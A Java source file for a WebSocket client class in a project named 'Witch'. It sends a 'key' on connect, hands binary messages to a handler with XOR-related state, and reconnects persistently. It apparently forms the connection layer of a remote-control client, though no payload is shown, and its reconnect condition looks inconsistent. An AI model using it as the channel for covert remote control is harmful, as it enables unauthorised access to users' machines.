package me.soda.witch.client.connection;

import me.soda.witch.client.Witch;
import me.soda.witch.client.utils.NetUtil;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;

import java.net.URI;
import java.nio.ByteBuffer;

public class Client extends WebSocketClient {
    public int reconnections = 0;

    public Client(URI serverURI) {
        super(serverURI);
    }

    @Override
    public void onOpen(ServerHandshake handshakeData) {
        Witch.println("Connection initialized");
        NetUtil.send("key");
    }

    @Override
    public void onMessage(String message) {
    }

    @Override
    public void onMessage(ByteBuffer bytes) {
        MessageHandler.handleRaw(bytes.array());
    }

    @Override
    public void onClose(int code, String reason, boolean remote) {
        boolean tooMany = reconnections > 10;
        Witch.messageUtils.acceptXOR = false;
        if (code == 1 || !tooMany) {
            Witch.tryReconnect(this::reconnect);
            reconnections++;
        } else {
            Witch.println("Witch end because of manual shutdown or too many reconnections");
        }
    }

    @Override
    public void onError(Exception e) {
        Witch.printStackTrace(e);
    }
}